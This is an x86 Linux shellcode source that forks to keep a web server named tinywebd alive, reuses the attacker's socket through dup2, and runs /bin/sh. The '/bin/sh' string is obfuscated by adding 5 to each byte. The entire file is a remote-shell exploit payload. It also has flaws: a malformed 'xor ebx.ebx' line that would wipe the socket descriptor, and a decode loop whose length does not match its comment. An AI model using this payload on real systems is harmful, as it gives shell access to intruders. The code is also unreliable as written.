BITS  32

push BYTE 0x02          ; fork() - syscall #2
pop  eax                ; put 2 in EAX
int  0x80               ; call fork()
test eax,eax            ;
jz   child_process      ; jump if zero flag is set

; parent process , restore tinywebd
lea  ebp,[esp+0x68]     ; Restore EBP
push 0x08048fb7         ; push the return address
ret                     ; jump to the return address

child_process:
; Reuse the existing socket
lea  edx,[esp+0x5c]     ; address of new_sockfd in edx
mov  ebx,[edx]          ; put the address in EBX
push BYTE 0x02          ;
pop  ecx                ; starting ECX at 2
xor  eax,eax            ; zero out EAx
xor  ebx.ebx            ; zero out EBX

dup_loop:
mov  BYTE al,0x3f       ; dup2() syscall #63
int  0x80               ; dup2(c,0)
dec  ecx                ; count down to 0
jns  dup_loop           ; jump if sign flag is not set

; execve(filename,argv[],envp[])
mov  BYTE al,11         ; execve() syscall #11
push 0x056d7834         ; push "/sh\x00" encoded by +05 into stack
push 0x736e6734         ; push "/bin" encoded +05 into stack
mov  ebx,esp            ; put its address in EBX
; int3

push BYTE 0x8           ; decode 8 bytes
pop  edx                ;

decode_loop:
sub  BYTE [ebx+edx],0x5 ; decode the bytes by subtracting 5
dec  edx                ;
jns  decode_loop        ;
; int3

xor  edx,edx            ; zero out EDX
push edx                ; null terminator
mov  edx,esp            ; envp[] = null
push ebx                ; push string address to top
mov  ecx,esp            ; argv[]
int  0x80               ; execve("/bin//sh",["/bin/sh",NULL],NULL)
